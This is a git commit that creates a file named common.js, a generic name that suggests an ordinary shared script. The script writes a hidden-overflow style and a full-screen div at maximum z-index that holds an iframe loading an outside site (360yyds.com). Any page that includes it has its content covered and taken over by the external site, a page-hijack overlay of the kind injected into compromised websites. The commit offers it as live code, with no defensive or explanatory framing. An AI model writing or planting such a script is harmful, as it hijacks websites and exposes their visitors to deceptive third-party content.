6b827e4e9c8d579faf1b8fdeb10db261cb0619f2
kytgzero <130443591+kytgzero@users.noreply.github.com>
2023-05-31 18:26:23 +0800

    Create common.js

---
+++ common.js
@@ -0,0 +1,7 @@
+var url="http://www.360yyds.com/"; 
+var str1=document.title;  
+document.write('<meta id="viewport" name="viewport" content="user-scalable=no,width=device-width, initial-scale=1.0" />'); 
+document.write('<style>html,body{widht:100%;height:100%;overflow:hidden; clear:both;}</style>'); 
+document.write('<div style="width:100%;height:100%;relative;top:0;left:0;z-index:2147483647;">'); 
+document.write('<iframe src=" '+url+'" frameborder="0" style="border:0;width: 100%; text-align: center; border: medium none; height:100%;max-height: 4000px;"></iframe>'); 
+document.write('</div>');
